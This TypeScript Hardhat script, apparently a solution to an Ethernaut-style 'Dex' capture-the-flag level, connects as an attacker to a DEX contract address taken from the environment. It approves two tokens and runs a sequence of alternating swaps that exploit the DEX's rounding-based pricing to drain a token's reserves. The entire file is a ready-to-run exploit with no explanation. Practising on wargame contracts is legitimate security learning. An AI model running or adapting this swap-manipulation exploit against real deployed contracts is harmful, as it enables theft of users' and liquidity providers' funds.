import { TransactionResponse } from "@ethersproject/providers";
import { fail } from "assert";
import { ethers } from "hardhat";

async function dexHack() {
  let tx: TransactionResponse;

  const dexAddress = process.env.DEX_ADDRESS || fail("DEX_ADDRESS Not Found In .env");
  const dex = await ethers.getContractAt("Dex", dexAddress);
  const [attacker] = await ethers.getSigners();
  const attackerAddress = await attacker.getAddress();
  const tokenOneAddress = await dex.token1();
  const tokenTwoAddress = await dex.token2();
  const tokenOne = await ethers.getContractAt("SwappableToken", tokenOneAddress);
  const tokenTwo = await ethers.getContractAt("SwappableToken", tokenTwoAddress);

  //@ts-ignore
  tx = await tokenOne.connect(attacker).approve(attackerAddress, dex.address, 500);
  await tx.wait(1);

  //@ts-ignore
  tx = await tokenTwo.connect(attacker).approve(attackerAddress, dex.address, 500);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 10);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 20);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 24);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 30);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 41);
  await tx.wait(1);

  tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 45);
  await tx.wait(1);
}

dexHack().catch((error) => {
  console.error(error);
  process.exit(1);
});
